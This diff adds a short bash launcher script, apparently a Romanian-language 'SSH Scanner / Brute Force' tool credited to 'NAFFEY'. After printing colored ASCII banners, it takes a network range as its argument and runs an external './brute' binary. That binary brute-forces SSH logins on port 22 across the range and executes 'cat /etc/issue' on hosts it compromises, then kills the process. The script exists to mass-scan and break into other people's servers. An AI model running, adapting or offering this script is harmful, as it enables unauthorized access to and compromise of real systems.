@@ -1,0 +1,36 @@
+#!/bin/bash
+rm -rf scan.log
+#
+WHI='[1;37m'
+BLK='[1;30m'
+RED='[1;31m'
+YEL='[1;33m'
+BLU='[1;34m'
+NoN='[4;37m'
+RES='[0m'
+clear
+clear
+echo "${RES}"
+echo "	 									"
+echo -e ${RED}"                d8b   db   d8b   d88888b d88888b d88888b db    db "
+echo -e "                888o  88 d8   8b 88      88      88       8b  d8  "
+echo -e "                88V8o 88 88ooo88 88ooo   88ooo   88ooooo   8bd8   "
+echo -e "                88 V8o88 88~~~88 88~~~   88~~~   88~~~~~    88    "
+echo -e "                88  V888 88   88 88      88      88.        88    "
+echo -e "                VP   V8P YP   YP YP      YP      Y88888P    YP    "
+sleep 2
+echo -e ${RED}"                ${WHI}*${BLU} SSH Scanner ${WHI}: ${RED}Version  v2.0                  ${WHI}* "
+sleep 2
+echo -e ${RED}"                ${WHI}*${BLU} Brute Force/Scanner ${WHI}:${RED} Ubuntu/Centos Platform ${WHI}*              "
+sleep 2
+echo -e ${RED}"                ${WHI}*${BLU} Author ${WHI}: ${RED}"" NAFFEY                           ${WHI}*"
+sleep 2
+if [ $# != 1 ]; then
+        echo "${WHI}   Comanda: $0 clasa.clasa${RES}"
+        exit;
+fi
+echo "${NoN}"
+./brute 5500 -b $1 naffey 22 "cat /etc/issue"
+sleep 10
+pkill brute
+echo "${RED}*${BLK} Am Terminat.${RES}"
